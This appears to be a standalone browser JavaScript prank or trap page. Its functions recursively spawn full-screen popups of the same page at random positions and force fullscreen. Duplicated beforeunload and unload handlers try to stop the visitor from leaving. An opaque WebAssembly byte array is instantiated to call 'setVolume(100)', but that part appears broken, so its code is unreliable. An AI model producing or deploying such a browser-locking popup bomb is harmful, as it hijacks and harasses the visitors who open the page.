var elem = document.documentElement;
function openFullscreen() {
  try {
    if (elem.requestFullscreen) {
      elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) {
      /* Safari */
      elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) {
      /* IE11 */
      elem.msRequestFullscreen();
    }
  } catch (e) {
    alert(e);
  }
}

function fun() {
  var popup = window.open("index.html#1", "", "width=1000");
  if (popup == null) {
    alert("Please enable popups for this website.");
  } else {
    popup.moveTo(
      window.innerWidth * Math.random(),
      window.innerHeight * Math.random()
    );
    popup.resizeTo(screen.width, screen.height);
  }
  fun();
}

function submit() {
  fun();
}

window.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    submit();
  }
});

var p = JSON.stringify(window.location);
if (p.includes("#")) {
  fun();
}

window.addEventListener("beforeunload", function (e) {
  e.preventDefault();
  e.returnValue = "";
});

window.onbeforeunload = function () {
  var message = "Do you want to leave this page?";
  return message;
};

window.onunload = function () {
  return "Are you sure you want to leave this page?";
};

window.addEventListener("unload", function (e) {
  e.preventDefault();
  e.returnValue = "";
});

window.onbeforeunload = function () {
  return "Are you sure you want to leave this page?";
};

const wasmCode = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 135, 128, 128, 128, 0, 2, 96, 1, 127, 1, 127,
  96, 0, 0, 2, 140, 128, 128, 128, 0, 1, 3, 101, 110, 118, 5, 115, 101, 116,
  117, 112, 0, 0, 3, 130, 128, 128, 128, 0, 1, 1, 4, 103, 101, 116, 0, 1, 3, 1,
  1, 5, 105, 110, 105, 116, 0, 0, 10, 152, 128, 128, 128, 0, 1, 142, 128, 128,
  128, 0, 0, 65, 0, 11,
]);
const wasmModule = new WebAssembly.Module(wasmCode);
const wasmInstance = new WebAssembly.Instance(wasmModule, {});
const setVolume = wasmInstance.exports.setVolume;
setVolume(100);
